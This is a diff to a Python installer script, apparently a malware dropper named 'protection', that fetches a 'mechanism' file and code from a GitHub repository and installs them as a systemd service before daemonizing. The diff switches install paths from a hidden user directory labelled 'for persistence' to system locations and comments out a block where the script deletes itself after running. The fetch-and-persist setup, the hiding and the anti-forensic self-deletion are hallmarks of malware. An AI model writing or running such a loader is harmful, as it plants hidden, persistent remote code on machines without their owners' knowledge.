@@ -47,30 +47,30 @@ repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/ma
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
-## Define the output file paths
-#envPath = "/usr/local/bin/protectionEnv"
-#pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
-#repoFilePath = "/usr/local/bin/protection.py"
-#requirementsFilePath = "/usr/local/bin/requirements.txt"
-#contentFilePath = "/usr/local/bin/mechanism"
-#serviceFilePath = "/etc/systemd/system/protection.service"
+# Define the output file paths
+envPath = "/usr/local/bin/protectionEnv"
+pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
+repoFilePath = "/usr/local/bin/protection.py"
+requirementsFilePath = "/usr/local/bin/requirements.txt"
+contentFilePath = "/usr/local/bin/mechanism"
+serviceFilePath = "/etc/systemd/system/protection.service"
 
-# Get the user's home directory
-home = os.path.expanduser("~")
-
-# Define a hidden writable directory for persistence
-basePath = os.path.join(home, ".local/share/protection")
-
-# Ensure the directory exists
-os.makedirs(basePath, exist_ok=True)
-
-# Define the new paths
-envPath = os.path.join(basePath, "protectionEnv")
-pythonPath = os.path.join(envPath, "bin/python3")
-repoFilePath = os.path.join(basePath, "protection.py")
-requirementsFilePath = os.path.join(basePath, "requirements.txt")
-contentFilePath = os.path.join(basePath, "mechanism")
-serviceFilePath = os.path.join(home, ".config/systemd/user/protection.service")
+## Get the user's home directory
+#home = os.path.expanduser("~")
+#
+## Define a hidden writable directory for persistence
+#basePath = os.path.join(home, ".local/share/protection")
+#
+## Ensure the directory exists
+#os.makedirs(basePath, exist_ok=True)
+#
+## Define the new paths
+##envPath = os.path.join(basePath, "protectionEnv")
+##pythonPath = os.path.join(envPath, "bin/python3")
+##repoFilePath = os.path.join(basePath, "protection.py")
+##requirementsFilePath = os.path.join(basePath, "requirements.txt")
+##contentFilePath = os.path.join(basePath, "mechanism")
+##serviceFilePath = os.path.join(home, ".config/systemd/user/protection.service")
 
 
 # Function to create a virtual environment and install requests
@@ -241,17 +241,17 @@ if __name__ == "__main__":
     except Exception as e:
         pass
 
-    try:
-        # Get the full path of the script
-        script_path = os.path.abspath(__file__)  
-
-        # Optional: Add delay to ensure the script has finished executing
-        time.sleep(1)  
-
-        # Delete the script file
-        os.remove(script_path)  
-    except Exception as e:
-        pass
+#    try:
+#        # Get the full path of the script
+#        script_path = os.path.abspath(__file__)  
+#
+#        # Optional: Add delay to ensure the script has finished executing
+#        time.sleep(1)  
+#
+#        # Delete the script file
+#        os.remove(script_path)  
+#    except Exception as e:
+#        pass
 
     # Daemonize the process
     daemonize()
